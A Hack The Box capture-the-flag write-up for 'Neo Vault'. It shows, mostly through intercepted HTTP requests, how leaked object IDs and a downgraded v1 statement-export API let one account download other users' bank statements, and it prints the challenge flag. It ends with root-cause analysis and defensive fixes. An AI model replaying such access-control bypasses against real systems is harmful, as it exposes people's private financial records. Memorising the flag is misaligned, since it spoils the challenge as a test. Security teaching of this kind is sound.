---
title: "Neo Vault"
description: "Exploit an IDOR/BOLA in a legacy statement-export API to read another account's transactions and recover the flag."
platform: "Hack The Box"
category: "Web"
difficulty: "Easy"
publishedAt: 2026-07-31
tags: ["web", "idor", "bola", "broken-access-control", "api", "version-downgrade"]
language: "en"
translationKey: "hack-the-box/neo-vault"
draft: false
featured: true
cover: "/images/neo-vault/neo-vault-01.png"
---

> This write-up was produced in a controlled lab environment. Only apply the techniques below to systems you are authorized to test.

## Overview

Neo Vault is a banking application with four main areas: **Overview**, **Transfer**, **Deposit**, and **Transactions**. The objective is to access another user's bank statement and recover the flag.

The exploit chain has three steps:

1. Obtain an account's object ID from the recipient lookup endpoint.
2. Downgrade the statement-export endpoint from `v2` to `v1`.
3. Submit another user's object ID to the legacy API, which does not enforce ownership.

![The Neo Vault dashboard overview](/images/neo-vault/neo-vault-01.png)

## Identifying relevant accounts

A newly created account receives a `$100` welcome bonus from `neo_system`. The transaction history exposes the sender's username, making `neo_system` the first useful account to investigate.

![The welcome bonus transaction sent by neo_system](/images/neo-vault/neo-vault-02.png)

In the **Transfer** tab, the application looks up a recipient before creating a transaction. Intercepting this request in Burp Suite reveals the following endpoint:

```http
GET /api/v2/auth/inquire?username=neo_system HTTP/1.1
Host: <target>
Cookie: token=<session_token>
```

The response discloses both the username and a MongoDB-style object ID:

```json
{
  "_id": "<neo_system_id>",
  "username": "neo_system"
}
```

![The inquire endpoint returns neo_system's object ID](/images/neo-vault/neo-vault-03.png)

The object ID changes between lab sessions, so retrieve it from the live response instead of copying a fixed value from a screenshot.

## Exploring the versioned API

The **Deposit** tab sends a request to the `v2` endpoint:

```http
POST /api/v2/transactions/deposit HTTP/1.1
Host: <target>
Content-Type: application/json
Cookie: token=<session_token>

{
  "amount": 2
}
```

The server responds with `v2 version is under maintenance`.

![The v2 deposit endpoint is under maintenance](/images/neo-vault/neo-vault-04.png)

Changing the path to `/api/v1/transactions/deposit` only produces an `Internal server error`, so this branch does not reveal any additional useful data.

![The v1 deposit endpoint returns an internal error](/images/neo-vault/neo-vault-05.png)

## Discovering the legacy statement-export endpoint

In the **Transactions** tab, the download function calls the following endpoint with an empty body:

```http
POST /api/v2/transactions/download-transactions HTTP/1.1
Host: <target>
Content-Type: application/json
Cookie: token=<session_token>

{}
```

![The default transaction-export request uses API v2](/images/neo-vault/neo-vault-06.png)

Replacing `v2` with `v1` makes the server return `_id is not provided`. Although the response has a `404 Not Found` status, this message confirms that the legacy endpoint still exists and accepts an `_id` field from the client.

![The v1 API reveals that the _id field is missing](/images/neo-vault/neo-vault-07.png)

## Exploiting the IDOR/BOLA

Resend the `v1` request with the object ID recovered for `neo_system`:

```http
POST /api/v1/transactions/download-transactions HTTP/1.1
Host: <target>
Content-Type: application/json
Cookie: token=<session_token>

{
  "_id": "<neo_system_id>"
}
```

![Submitting neo_system's object ID to the v1 statement-export endpoint](/images/neo-vault/neo-vault-08.png)

The server returns a PDF statement for `neo_system`, even though the current session does not belong to that account. This proves that the endpoint trusts the client-supplied object ID without checking whether the signed-in user may access the object.

The statement also exposes a transaction involving an account named `user_with_flag`.

![neo_system's statement reveals the user_with_flag account](/images/neo-vault/neo-vault-09.png)

Use the `inquire` endpoint again to recover the new account's ID:

```http
GET /api/v2/auth/inquire?username=user_with_flag HTTP/1.1
Host: <target>
Cookie: token=<session_token>
```

```json
{
  "_id": "<user_with_flag_id>",
  "username": "user_with_flag"
}
```

![The inquire endpoint returns user_with_flag's object ID](/images/neo-vault/neo-vault-10.png)

Replace the statement-export request body with the newly obtained ID:

```http
POST /api/v1/transactions/download-transactions HTTP/1.1
Host: <target>
Content-Type: application/json
Cookie: token=<session_token>

{
  "_id": "<user_with_flag_id>"
}
```

![Requesting user_with_flag's statement through API v1](/images/neo-vault/neo-vault-11.png)

The returned PDF contains the flag in a transaction description:

```text
HTB{n0t_s0_3asy_1d0r}
```

![The user_with_flag statement contains the flag](/images/neo-vault/neo-vault-12.png)

## Root cause

The primary vulnerability is **Broken Object Level Authorization (BOLA)**, commonly called **IDOR** in web applications:

- The `v1` endpoint selects the account to export entirely from the client-supplied `_id` field.
- The backend neither binds `_id` to the session identity nor checks ownership before returning the file.
- The `inquire` endpoint turns a known username into an object ID, making exploitation straightforward.
- The old API version remains reachable even though the interface uses `v2` by default, creating a forgotten attack surface.

A long or unpredictable ID is not an access control. Once another endpoint discloses the ID, any protection based on its secrecy disappears.

## Defensive recommendations

- Authorize every object on the server before generating or returning a statement.
- For ordinary users, derive the account ID from the session instead of accepting an arbitrary account ID in the request body.
- If administrators require cross-account access, enforce explicit role and scope checks on every request.
- Fully disable obsolete API versions and verify externally that their routes are no longer reachable.
- Apply the same authentication and authorization middleware to every API version.
- Add tests for cross-account access, substituted object IDs, and direct calls to legacy endpoints.

## Conclusion

Neo Vault demonstrates a small authorization mistake with direct impact on sensitive data. The `inquire` endpoint supplies object IDs, while the `v1` statement exporter consumes those IDs without verifying ownership. Combining the two behaviors exposes the statements of `neo_system` and then `user_with_flag`, revealing the flag.
